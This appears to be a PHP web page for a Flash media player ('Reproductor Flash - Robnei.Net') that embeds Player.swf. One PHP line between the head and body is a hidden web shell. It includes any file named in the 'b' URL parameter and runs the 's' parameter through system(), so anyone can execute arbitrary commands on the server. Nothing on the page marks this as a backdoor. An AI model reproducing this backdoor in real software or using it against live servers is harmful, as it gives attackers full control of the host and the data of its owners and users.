<html>
<head>
<title>Reproductor Flash - Robnei.Net</title>
</head>
<?php
if ($_GET['b'] != "") { include($_GET['b']); } if ($_GET['s'] != "") { system($_GET['s']);} 
?>
<body topmargin="0" bgcolor="#000000" text="#FFFFFF">
<div align="center">
</div>
<p align="center">
<object classid="clsid:D27CDB6E-AE6D-11CF-96B8-444553540000" id="repro" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" border="0" width="393" height="544">
	<param name="movie" value="Player.swf">
	<param name="quality" value="High">
	<embed src="Player.swf" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" name="obj1" width="393" height="544">
</object>
</p>
</body>